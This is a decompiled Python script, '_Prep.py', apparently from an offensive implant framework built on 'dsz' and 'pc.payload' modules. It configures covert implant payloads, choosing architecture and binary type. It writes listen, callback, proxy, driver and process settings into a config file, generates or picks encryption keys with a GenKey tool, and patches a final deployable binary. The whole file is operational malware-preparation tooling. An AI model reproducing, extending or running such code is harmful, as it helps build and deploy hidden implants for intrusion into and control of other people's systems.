# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _Prep.py
import dsz
import dsz.lp
import dsz.menu
import dsz.version
import pc.payload
import glob
import os
import re
import shutil
import sys
PARAM_ARCH_X86 = 'i386'
PARAM_ARCH_X64 = 'x64'
PARAM_TYPE_LEVEL3 = 'level3'
PARAM_TYPE_LEVEL4 = 'level4'
PARAM_BINTYPE_EXE = 'exe'
PARAM_BINTYPE_SHAREDLIB = 'sharedlib'

def main():
    dsz.control.echo.Off()
    params = dsz.lp.cmdline.ParseCommandLine(sys.argv, '_Prep.txt')
    if len(params) == 0:
        return False
    else:
        defaultFlags = list()
        driverName = ''
        procName = ''
        infoValue = ''
        if params.has_key('driver'):
            driverName = params['driver'][0]
        if params.has_key('process'):
            procName = params['process'][0]
        if params.has_key('info'):
            infoValue = params['info'][0]
        if params.has_key(PARAM_ARCH_X86):
            params['arch'] = [
             PARAM_ARCH_X86]
        elif params.has_key(PARAM_ARCH_X64):
            params['arch'] = [
             PARAM_ARCH_X64]
        if params.has_key(PARAM_TYPE_LEVEL3):
            params['type'] = [
             PARAM_TYPE_LEVEL3]
        elif params.has_key(PARAM_TYPE_LEVEL4):
            params['type'] = [
             PARAM_TYPE_LEVEL4]
        if params.has_key(PARAM_BINTYPE_EXE):
            params['bintype'] = [
             PARAM_BINTYPE_EXE]
        else:
            if params.has_key(PARAM_BINTYPE_SHAREDLIB):
                params['bintype'] = [
                 PARAM_BINTYPE_SHAREDLIB]
            configFile = ''
            finalBinary = ''
            payloadInfo = None
            if params['action'][0].lower() == 'configure':
                payloadInfo = pc.payload.PickForPrep(params)
                if payloadInfo == None:
                    return False
                path, file = pc.payload.CreateConfigDir(payloadInfo)
                configLines = list()
                configGood = False
                isL3 = False
                masterspec = pc.payload.config.MasterSpec(params)
                keyName = masterspec.parse(str, 'key')
                while not configGood:
                    advanced = len(masterspec.getUnused().keys()) > 0 or dsz.ui.Prompt('Update advanced settings', False)
                    configLines.append("<?xml version='1.0' encoding='UTF-8' ?>\n")
                    configLines.append('<PCConfig>\n')
                    isL3 = pc.payload.config.isLevel3(payloadInfo['Type'])
                    isExe = payloadInfo['BinType'].lower() == 'exe'
                    isUtbu = payloadInfo['Persistence'].lower() == 'utilityburst'
                    isProxy = payloadInfo['Extra'].has_key('CommsType') and payloadInfo['Extra']['CommsType'].lower() == 'http'
                    configLines.extend(pc.payload.config.SetFlags(isL3, isExe, isProxy, advanced, masterspec))
                    configLines.extend(pc.payload.config.SetId(masterspec))
                    configLines.extend(pc.payload.config.SetListenInfo(isL3, isProxy, configLines, advanced, masterspec))
                    configLines.extend(pc.payload.config.SetCallbackInfo(isL3, advanced, masterspec))
                    configLines.extend(pc.payload.config.SetMiscInfo(isL3, isUtbu, driverName, procName, infoValue, advanced, masterspec))
                    configLines.extend(pc.payload.config.SetProxyConfig(isProxy, advanced, masterspec))
                    payloadInfo['Extra']['KeyLocation'] = ''
                    while payloadInfo['Extra']['KeyLocation'] == '':
                        payloadInfo['Extra']['KeyLocation'] = _getPcKey(keyName)

                    configLines.append('</PCConfig>\n')
                    dsz.ui.Echo('Configuration:')
                    dsz.ui.Echo('')
                    for line in configLines:
                        dsz.ui.Echo(line.rstrip())

                    dsz.ui.Echo('')
                    complaints = masterspec.getUnusedAsString()
                    if len(complaints) != 0:
                        dsz.ui.Echo('There are some unused specification options: ' + complaints, dsz.WARNING)
                        dsz.ui.Echo('')
                    if dsz.ui.Prompt('Is this configuration valid', True):
                        configGood = True
                    else:
                        configLines = list()

                try:
                    with open(path + '/config.xml', 'wb') as f:
                        f.write('\xef\xbb\xbf')
                        f.writelines(configLines)
                except:
                    dsz.ui.Echo('* Failed to write configuration file', dsz.ERROR)
                    return False

                try:
                    os.mkdir(path + '/Keys')
                except:
                    pass

                try:
                    shutil.copy(payloadInfo['Extra']['KeyLocation'] + '/private_key.bin', path + '/Keys/private_key.bin')
                    shutil.copy(payloadInfo['Extra']['KeyLocation'] + '/public_key.bin', path + '/Keys/public_key.bin')
                except:
                    dsz.ui.Echo('* Failed to copy keys', dsz.WARNING)
                    dsz.ui.Pause()

                finalBinary = pc.payload.exe.ConfigBinary(path, file, payloadInfo['Extra'])
                if finalBinary == '':
                    dsz.ui.Echo('* Failed to configure binary', dsz.ERROR)
                    return False
                configFile = pc.payload.StoreInfo(payloadInfo, path, finalBinary)
                if configFile == '':
                    dsz.ui.Echo('* Failed to write payload information file', dsz.ERROR)
                    return False
            elif params['action'][0].lower() == 'disable':
                if not params.has_key('file'):
                    dsz.ui.Echo('* Disable requires the -file option', dsz.ERROR)
                    return False
                adir = dsz.path.Split(params['file'][0])[0]
                if len(adir) == 0:
                    dsz.ui.Echo('* Unable to disable ' + params['file'][0], dsz.ERROR)
                    return False
                os.rename(adir + '\\payload_info.xml', adir + '\\payload_info.xml.deployed')
            else:
                dirs = pc.payload.GetConfigured(params)
                if len(dirs) == 0:
                    dsz.ui.Echo('* No matching payloads found', dsz.ERROR)
                    return False
                if params['action'][0].lower() == 'list':
                    _configList(dirs, params)
                else:
                    dsz.ui.Echo('')
                    dsz.ui.Echo(' 0) - Quit')
                    _configList(dirs, params)
                    pick = -1
                    while pick == -1:
                        val = dsz.ui.GetInt('Pick the payload')
                        if val == 0:
                            return False
                        if val < 0 or val > len(dirs):
                            dsz.ui.Echo('* Invalid choice', dsz.ERROR)
                        else:
                            pick = val

                    index = pick - 1
                    payloadInfo = pc.payload.GetInfo(dirs[index])
                    if payloadInfo == None:
                        dsz.ui.Echo('* Failed to get payload info')
                        return False
                finalBinary = payloadInfo[pc.payload.FinalizedBinaryField]
                configFile = dirs[index] + '/payload_info.xml'
        if payloadInfo != None:
            dsz.script.data.Start('Payload')
            if payloadInfo['Name'] != '':
                for key in pc.payload.PayloadFields:
                    if key == pc.payload.FinalizedBinaryField:
                        if len(configFile) > 0:
                            dsz.script.data.Add('ConfigFile', configFile, dsz.TYPE_STRING)
                        if len(finalBinary) > 0:
                            dsz.script.data.Add(key, finalBinary, dsz.TYPE_STRING)
                            dsz.ui.Echo('Configured binary at:')
                            dsz.ui.Echo('  ' + finalBinary)
                    else:
                        dsz.script.data.Add(key, payloadInfo[key], dsz.TYPE_STRING)

            dsz.script.data.End()
            dsz.script.data.Store()
        return True


def _configList(dirs, params):
    for i, pdir in enumerate(dirs, 1):
        try:
            info = pc.payload.GetInfo(pdir)
            dsz.ui.Echo('')
            dsz.ui.Echo('%2u) - %s' % (i, pdir))
            dsz.ui.Echo('    %s (%s)' % (info['Description'], info['Name']))
            dsz.ui.Echo('        %s-%s %s %s' % (info['Arch'], info['Os'], info['Type'], info['BinType']))
            if info.has_key('Extra'):
                for key, value in info['Extra'].items():
                    dsz.ui.Echo("        %s='%s'" % (key, value))

            dsz.ui.Echo('')
            if params.has_key('verbose') and params['verbose'][0] == 'true':
                try:
                    with open(pdir + '\\config.xml', 'r') as f:
                        for line in f.readlines():
                            dsz.ui.Echo('        ' + line.rstrip())

                except:
                    pass

        except:
            dsz.ui.Echo('* Failed to get info for ' + pdir, dsz.ERROR)


def _getPcKey(useKey):
    resDir = dsz.lp.GetResourcesDirectory()
    pcResDir = resDir + 'Pc\\Keys\\'
    keys = list()
    keys.append('Create a new key')
    dirs = glob.glob(pcResDir + '*')
    for dirName in dirs:
        if os.path.exists(dirName + '\\private_key.bin'):
            f = dsz.path.Split(dirName)[1]
            if len(f) > 0:
                keys.append(f)

    if useKey in keys:
        choice = useKey
    else:
        choice = dsz.menu.ExecuteSimpleMenu('Pick a key', keys)[0]
    if len(choice) == 0:
        dsz.ui.Echo('* Failed to pick a key', dsz.ERROR)
        return ''
    pcKeyDir = pcResDir
    if choice == 'Create a new key':
        keyName = ''
        while len(keyName) == 0:
            keyName = dsz.ui.GetString('Enter the key name')

        ver = dsz.version.Info(dsz.script.Env['local_address'])
        toolLoc = resDir + 'Pc\\Tools\\%s-%s\\GenKey.exe' % (ver.compiledArch, ver.os)
        pcKeyDir += keyName
        try:
            os.mkdir(pcKeyDir)
        except:
            pass

        x = dsz.control.Method()
        dsz.control.echo.On()
        if not dsz.cmd.Run('local run -command "%s 2048 %s" -redirect -noinput' % (toolLoc, pcKeyDir)):
            dsz.ui.Echo('* Failed to generate new key', dsz.ERROR)
            return ''
        dsz.control.echo.Off()
    else:
        pcKeyDir += choice
    return pcKeyDir


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)